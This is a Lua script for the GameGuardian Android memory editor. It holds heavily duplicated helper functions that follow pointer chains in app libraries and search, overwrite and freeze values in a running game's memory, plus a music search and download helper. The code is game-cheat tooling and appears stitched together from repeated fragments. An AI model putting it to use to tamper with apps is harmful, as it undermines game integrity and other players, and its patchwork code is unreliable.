   for index,offset in ipairs(Address)do
      if index==1 then
         address=offset
      else
         address=gg.getValues({{address=address+offset,flags=4}})[1].value
      end
   end
   local Value,Freeze={},{}
   for index,value in ipairs(AFV)do
      local VALUE={address=address+value[3],flags=value[2],value=value[1],freeze=true}
      if value[4]then
         Freeze[#Freeze+1]=VALUE
      else
         Value[#Value+1]=VALUE
      end
   end
   gg.setValues(Value)
   gg.addListItems(Freeze)
end


function Format(tab, format, value, type, Function)
    if format == "查看" then
        tab[1]["flags"] = type
        return print(gg.getValues(tab))
    elseif format == "修改" then
        tab[1]["flags"] = type
        tab[1]["value"] = value        
        return gg.setValues(tab)
    elseif format == "冻结" then
        tab[1]["flags"] = type
        tab[1]["freeze"] = true
        tab[1]["name"] = Function or "功能"       
        return gg.addListItems(tab)    
    elseif format == "加载" then
        tab[1]["flags"] = type
        return gg.loadResults(tab)    
    end
end

local ALL = [==[
v1.0 -> 优化指针链条判断

v1.1 -> 添加多功能模板，可查看，修改，冻结，载入

v1.3 -> 修复了同一个so名称下有多个基址头，而只判断第一个基址头偏移的问题点 

v1.4 -> 修复了在64位环境下偏移异常的问题
]==]

function LSQ_Chain(so, offset, format, value, type, Function)--模块设置, 偏移量, 功能参数, 修改值, 类型, 功能
        getRanges = getRanges or (function()
        local ranges = {}    		
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v["type"]:sub(2, 2) == 'w' then--判断so是否可读可写
			    ranges[#ranges+1] = v
			end
		end
    	return ranges
    end)        
    local rest, ranges, sostart, valtype = {}, getRanges(), nil , gg.TYPE_DWORD
    if gg.getTargetInfo()["x64"] then--判断应用程序是否为64位
        valtype = gg.TYPE_QWORD
    end
    
    for i in pairs(ranges) do
		local _name = ranges[i]["internalName"]:gsub('^.*/', '')
		if so[1] == _name and so[2] == ranges[i]["state"] then
			sostart = ranges[i]["start"]
			break
		end
	end
    
    if sostart then	
        if offset[1]  then	    	    
            for i = 1, #offset do    	    
    	        rest = {{flags = valtype,address = sostart + offset[i]}}
    	        rest = gg.getValues(rest)
		        if i == #offset then
                    break
                end
	 		    if valtype == gg.TYPE_DWORD then
				    sostart = rest[1].value & 0xFFFFFFFF--对值进行补位操作 
				else
				    sostart = rest[1].value			
			    end
		    end
	    end		    
	    print(rest)
	    if #rest == 1 then
	       
	    end
	    return Format(rest, format, value, type, Function)
    end
    gg.toast("功能:" .. Function .. "开启失败")
    print("功能开启失败原因: 未找到基址头")
    return os.exit()
end
function setvalue(address,flags,value) local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end






function readPointer(name, offset, i)
    local re = gg.getRangesList(name) 
    local x64 = gg.getTargetInfo().x64 
    local va = {[true]=32, [false]=4} 
    if re[i or 1] then
        local addr = re[i or 1].start + offset[1] 
        for i = 2, #offset do
            addr = gg.getValues({{address=addr, flags=va[x64]}}) 
            if not x64 then
                addr[1].value = addr[1].value & 0xFFFFFFFF 
            end
            addr = addr[1].value + offset[i] 
        end
        return addr
    end
end
-- 修改内存地址的函数
function gg.edits(addr, Table, name)
    local Table1 = {{}, {}} 
    for k, v in ipairs(Table) do
        local value = {address = addr+v[3], value = v[1], flags = v[2], freeze = v[4]}
        if v[4] then
            Table1[2][#Table1[2]+1] = value 
        else
            Table1[1][#Table1[1]+1] = value
        end
    end
    gg.addListItems(Table1[2])
    gg.setValues(Table1[1])
    gg.toast((name or "") .. "开启成功, 共修改"..#Table.."个值息白")
end






function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x167ba0fe)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		 else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
			print(string.char(231,190,164,58).._Q)
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end

local function readD ( a )
    return gg.getValues ( { {
            address = a ,
            flags = 4
        } } ) [ 1 ].value
end

function setvalue(address,flags,value)
local tt={} tt[1]={}
tt[1].address=address
tt[1].flags=flags
tt[1].value=value
gg.setValues(tt)
end

function addListltems(address,flags,value,freeze)
t={} t[1]={}
t[1].address=address
t[1].flags=flags
t[1].value=value
t[1].freeze=freeze
gg.addListItems(t)
end
function xfnb(add,lx)
return gg.getValues({
{
address=add,flags = lx
}
})[1].value
end


local function RUI(address)
return gg.getValues({{address = address, flags = gg.TYPE_QWORD}})[1].value
end
function setvalue(address,flags,value) local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end
function addListltems(address,flags,value,freeze) t={} t[1]={} t[1].address=address t[1].flags=flags t[1].value=value t[1].freeze=freeze gg.addListItems(t) end
local function RUI(address)
return gg.getValues({{address = address, flags = gg.TYPE_QWORD}})[1].value
end

function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] gg.setValues({[1] = {address = xgpy, flags = xglx, value = xgsz}}) xgsl = xgsl + 1 end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) xgjg = true end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "开启成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end
function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	function PS() end function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end
--基址



function readPointer(name, offset, i)--读取内存函数
    local re = gg.getRangesList(name) 
    local x64 = gg.getTargetInfo().x64 
    local va = {[true]=32, [false]=4} 
    if re[i or 1] then
        local addr = re[i or 1].start + offset[1] 
        for i = 2, #offset do
            addr = gg.getValues({{address=addr, flags=va[x64]}}) 
            if not x64 then
                addr[1].value = addr[1].value & 0xFFFFFFFF 
            end
            addr = addr[1].value + offset[i] 
        end
        return addr
    end
end
-- 
--
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x269CDB36)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		 else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
			-- print(string.char(231,190,164,58).._Q)
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end



local json =json--调用
local g = {}
g.file = gg.getFile()
g.sel = nil
gqlb={"请先搜索歌曲",}
idb={"1010"}
SN,gc=1,nil
g.config = gg.getFile():gsub("%lua$", "").."cfg"
function bei()
g.data = loadfile("音乐配置"..g.config)
if g.data ~= nil then
g.sel = g.data()
g.data = nil
end
if g.sel == nil then
g.sel = {"","10"}
end
end
bei()






function readPointer(name, offset, i)
    local re = gg.getRangesList(name) 
    local x64 = gg.getTargetInfo().x64 
    local va = {[true]=32, [false]=4} 
    if re[i or 1] then
        local addr = re[i or 1].start + offset[1] 
        for i = 2, #offset do
            addr = gg.getValues({{address=addr, flags=va[x64]}}) 
            if not x64 then
                addr[1].value = addr[1].value & 0xFFFFFFFF 
            end
            addr = addr[1].value + offset[i] 
        end
        return addr
    end
end




function PS() end 
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end--静态配置



function start(name,sl)
fw=gg.makeRequest("http://music.163.com/api/search/get?s="..name.."&type=1&offset=0&total=true&limit="..sl) return fw end
function play(id,name)
gg.toast("正在播放音乐："..name,true)
gg.playMusic("http://music.163.com/song/media/outer/url?id="..id..".mp3") end

function Play(gqlb,idb)
SN = gg.choice(gqlb,nil,ts) if SN == nil then XGCK =-1 else sn=gg.choice({"播放歌曲","播放并下载"},nil,"歌曲："..gqlb[SN]) if sn == nil then end if sn == 1 then play(idb[SN],gqlb[SN]) end if sn == 2 then
local XEY=gg.makeRequest("http://music.163.com/song/media/outer/url?id="..idb[SN]..".mp3").content local XEY1=gg.getFile():gsub("[^/]+$","")..gqlb[SN]..".mp3" io.open(XEY1,"w"):write(XEY) gg.alert("提示:\n\n音乐已成功下载位置:\n\n"..XEY1) end XGCK=-1 end end

function zjson(jsonr)
local str = jsonr local pattern = "\"[%w]+\":" string.gsub(str, pattern, function(v) if string.find(str, v) then str = string.gsub(str, v, string.gsub(v, "\"", "")) end end) str = string.gsub(str, ":", "=") str = string.gsub(str, "%[", "{") str = string.gsub(str, "%]", "}") local data = "-- WSG PRO 1.0.9(109)\nreturn " .. str local res = load(data)() return res end

function json(con)
res=zjson(con) zd=res.result.songCount pd=go3-zd if pd <= 0 then else go3=zd end ts="《"..go1.."》找到"..zd.."首歌曲，当前显示"..go3.."首" gqlb={} idb={} for i=1,go3 do gqlb[i]=res.result.songs[i].name idb[i]=res.result.songs[i].id
end end
---+音乐配置


function S_Pointer(t_So, t_Offset, _bit)
local function getRanges() local ranges = {} local t = gg.getRangesList('^/data/*.so*$') for i, v in pairs(t) do if v.type:sub(2, 2) == 'w' then table.insert(ranges, v) end end return ranges end local function Get_Address(N_So, Offset, ti_bit) local ti = gg.getTargetInfo() local S_list = getRanges() local _Q = tonumber(0x2C4D6BCE) local t = {} local _t local _S = nil if ti_bit then _t = 32 else _t = 4 end for i in pairs(S_list) do local _N = S_list[i].internalName:gsub('^.*/', '') if N_So[1] == _N and N_So[2] == S_list[i].state then _S = S_list[i] break end end if _S then t[#t + 1] = {} t[#t].address = _S.start + Offset[1] t[#t].flags = _t if #Offset ~= 1 then for i = 2, #Offset do local S = gg.getValues(t) t = {} for _ in pairs(S) do if not ti.x64 then S[_].value = S[_].value & 0xFFFFFFFF end t[#t + 1] = {} t[#t].address = S[_].value + Offset[i] t[#t].flags = _t end end end _S = t[#t].address end return _S end local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit)) return _A end


----动态基址写法配置

function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end
---静态基址写法配置


function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {address = xgpy, flags = xglx, value = xgsz}}) else gg.addListItems({[1] = {address = xgpy, flags = xglx, freeze = xgdj, value = xgsz}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "地址成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "失败") end end end end

--仿XS写法配置

function xqmnb(Search,Modification)
gg.clearResults() gg.setRanges(Search[1].memory) gg.searchNumber(Search[3].value,Search[3].type,false,536870912,0,-1) if gg.getResultCount()==0 then gg.toast(Search[2].name..'开启失败')  return end local Result=gg.getResults(gg.getResultCount()) local sum for index=4,#Search do  sum=0 for i=1,#Result do  if gg.getValues({{address=Result[i].address+Search[index].offset,flags=Search[index].type}})[1].value~=Search[index].lv then Result[i].Usable=true  sum=sum+1 end  end  if sum==#Result then gg.toast(Search[2].name..'开启失败') return end end  local Data,Freeze,Freezes={},{},0  sum=0 for index,value in ipairs(Modification)do for index=1,#Result do if not Result[index].Usable then  local Value={address=Result[index].address+value.offset,flags=value.type,value=value.value,freeze=true} if value.freeze then Freeze[#Freeze+1]=Value Freezes=Freezes+1 else Data[#Data+1]=Value  end  sum=sum+1 end end end gg.setValues(Data) gg.addListItems(Freeze)  if Freezes==0 then gg.toast(Search[2].name..'开启成功,共修改'..sum..'条数据') else gg.toast(Search[2].name..'开启成功,共修改'..sum..'条数据,冻结'..Freezes..'条数据') end gg.clearResults() end



-- 读取内存地址的函数
function readPointer(name, offset, i)
local re = gg.getRangesList(name)  local x64 = gg.getTargetInfo().x64  local va = {[true]=32, [false]=4}  if re[i or 1] then local addr = re[i or 1].start + offset[1]  for i = 2, #offset do addr = gg.getValues({{address=addr, flags=va[x64]}})  if not x64 then addr[1].value = addr[1].value & 0xFFFFFFFF end addr = addr[1].value + offset[i] end return addr end end
-- 修改内存地址的函数
function gg.edits(addr, Table, name)
local Table1 = {{}, {}}  for k, v in ipairs(Table) do local value = {address = addr+v[3], value = v[1], flags = v[2], freeze = v[4]} if v[4] then Table1[2][#Table1[2]+1] = value else Table1[1][#Table1[1]+1] = value end end gg.addListItems(Table1[2]) gg.setValues(Table1[1]) gg.toast((name or "") .. "开启成功, 共修改"..#Table.."个值") end
--lib7z.so:bss+0x6704+0x38A+0x310+0x114
--第1种方法。

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--配置专区↑↑
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] gg.setValues({[1] = {
	address = xgpy, flags = xglx, value = xgsz
}}) xgsl = xgsl + 1 end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) xgjg = true end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "开启成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end
function start(name,sl)
fw=gg.makeRequest("http://music.163.com/api/search/get?s="..name.."&type=1&offset=0&total=true&limit="..sl) return fw end
function play(id,name)
gg.toast("正在播放音乐："..name,true)
gg.playMusic("http://music.163.com/song/media/outer/url?id="..id..".mp3") end

function Play(gqlb,idb)
SN = gg.choice(gqlb,nil,ts) if SN == nil then XGCK =-1 else sn=gg.choice({"播放歌曲","播放并下载"},nil,"歌曲："..gqlb[SN]) if sn == nil then end if sn == 1 then play(idb[SN],gqlb[SN]) end if sn == 2 then
local XEY=gg.makeRequest("http://music.163.com/song/media/outer/url?id="..idb[SN]..".mp3").content local XEY1=gg.getFile():gsub("[^/]+$","")..gqlb[SN]..".mp3" io.open(XEY1,"w"):write(XEY) gg.alert("提示:\n\n音乐已成功下载位置:\n\n"..XEY1) end XGCK=-1 end end

function zjson(jsonr)
local str = jsonr local pattern = "\"[%w]+\":" string.gsub(str, pattern, function(v) if string.find(str, v) then str = string.gsub(str, v, string.gsub(v, "\"", "")) end end) str = string.gsub(str, ":", "=") str = string.gsub(str, "%[", "{") str = string.gsub(str, "%]", "}") local data = "-- WSG PRO 1.0.9(109)\nreturn " .. str local res = load(data)() return res end

function json(con)
res=zjson(con) zd=res.result.songCount pd=go3-zd if pd <= 0 then else go3=zd end ts="《"..go1.."》找到"..zd.."首歌曲，当前显示"..go3.."首" gqlb={} idb={} for i=1,go3 do gqlb[i]=res.result.songs[i].name idb[i]=res.result.songs[i].id
end end
function S_Pointer(t_So, t_Offset, _bit)
local function getRanges()
local ranges = {}
local t = gg.getRangesList('^/data/*.so*$')
for i, v in pairs(t) do
if v.type:sub(2, 2) == 'w' then
table.insert(ranges, v)
end
end
return ranges
end
local function Get_Address(N_So, Offset, ti_bit)
local ti = gg.getTargetInfo()
local S_list = getRanges()
local _Q = tonumber(0x269CDB36)
local t = {}
local _t
local _S = nil
if ti_bit then
_t = 32
else
	_t = 4
end--------q.q2.7..8。98.8h,35.36
for i in pairs(S_list) do
local _N = S_list[i].internalName:gsub('^.*/', '')
if N_So[1] == _N and N_So[2] == S_list[i].state then
_S = S_list[i]
break
end
end
if _S then
t[#t + 1] = {}
t[#t].address = _S.start + Offset[1]
t[#t].flags = _t
if #Offset ~= 1 then
for i = 2, #Offset do
local S = gg.getValues(t)
t = {}
for _ in pairs(S) do
if not ti.x64 then
S[_].value = S[_].value & 0xFFFFFFFF
end
t[#t + 1] = {}
t[#t].address = S[_].value + Offset[i]
t[#t].flags = _t
end
end
end
_S = t[#t].address
-- print(string.char(231,190,164,58).._Q)
end
return _S
end
local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
return _A
end
function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function edit(orig,ret)_om = orig[1].memory or orig[1][1]_ov = orig[3].value or orig[3][1]_on = orig[2].name or orig[2][1]gg.clearResults()gg.setRanges(_om)gg.searchNumber(_ov,orig[3].type or orig[3][2])sz = gg.getResultCount()if sz < 1 then gg.toast(_on.."失败")else sl = gg.getResults(720)for i = 1,sz do ist = true for v = 4,#orig do if ist == true and sl[i].value == _ov then cd = {{}}cd[1].address = sl[i].address+(orig[v].offset or orig[v][2])cd[1].flags = orig[v].type or orig[v][3]szpy = gg.getValues(cd)cdlv = orig[v].lv or orig[v][1]cdv = szpy[1].value if cdlv == cdv then pdjg = true ist = true else pdjg = false ist = false end end end if pdjg == true then szpy = sl[i].address for x = 1,#(ret)do xgpy = szpy+(ret[x].offset or ret[x][2])xglx = ret[x].type or ret[x][3]xgsz = ret[x].value or ret[x][1]xgdj = ret[x].freeze or ret[x][4]xgsj = {{
	address = xgpy,flags = xglx,value = xgsz
}}if xgdj == true then xgsj[1].freeze = xgdj gg.setValues(xgsj)else gg.setValues(xgsj)end end xgjg = true end end if xgjg == true then gg.toast(_on.."成功")else gg.toast(_on.."失败")end end end
function SearchWrite(Search, Write, Type) gg.clearResults() gg.setVisible(false) gg.searchNumber(Search[1][1], Type) local count = gg.getResultCount() local result = gg.getResults(count) gg.clearResults() local data = {} local base = Search[1][2] if (count > 0) then for i, v in ipairs(result) do v.isUseful = true end for k = 2, #Search do local tmp = {} local offset = Search[k][2] - base local num = Search[k][1] for i, v in ipairs(result) do tmp[#tmp+1] = {} tmp[#tmp].address = v.address + offset tmp[#tmp].flags = v.flags end tmp = gg.getValues(tmp) for i, v in ipairs(tmp) do if (tostring(v.value) ~= tostring(num)) then result[i].isUseful = false end end end for i, v in ipairs(result) do if (v.isUseful) then data[#data+1] = v.address end end if (#data > 0) then gg.toast("搜索到"..#data.."条数据") local t = {} local base = Search[1][2] for i = 1, #data do for k, w in ipairs(Write) do offset = w[2] - base t[#t+1] = {} t[#t].address = data[i] + offset t[#t].flags = Type t[#t].value = w[1] if (w[3] == true) then local item = {} item[#item+1] = t[#t] item[#item].freeze = true gg.setValues(item) end end end gg.setValues(t) gg.toast("已修改"..#t.."条数据") gg.setValues(t) else gg.toast("not found", false) return false end else gg.toast("Not Found") return false end end
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {
	address = xgpy, flags = xglx, value = xgsz
}}) else gg.setValues({[1] = {
	address = xgpy, flags = xglx, freeze = xgdj, value = xgsz
}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "地址成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "失败") end end end end
function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt = {} tt[1] = {} tt[1].address = address tt[1].flags = flags tt[1].value = value gg.setValues(tt) end
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {
	address = xgpy, flags = xglx, value = xgsz
}}) else gg.setValues({[1] = {
	address = xgpy, flags = xglx, freeze = xgdj, value = xgsz
}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "地址成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end
-----仿XS>>>
